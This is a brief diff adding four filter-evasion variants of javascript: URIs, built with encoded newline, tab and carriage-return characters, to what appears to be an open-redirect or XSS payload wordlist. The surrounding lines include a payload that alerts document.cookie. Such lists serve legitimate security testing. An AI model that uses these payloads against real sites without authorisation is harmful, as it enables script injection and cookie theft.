@@ -270,3 +270,7 @@ javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
 ///google.com
 /////google.com/
 /////google.com
+java%0ascript:alert(1)
+java%09script:alert(1)
+java%0dscript:alert(1)
+javascript://%0aalert(1)
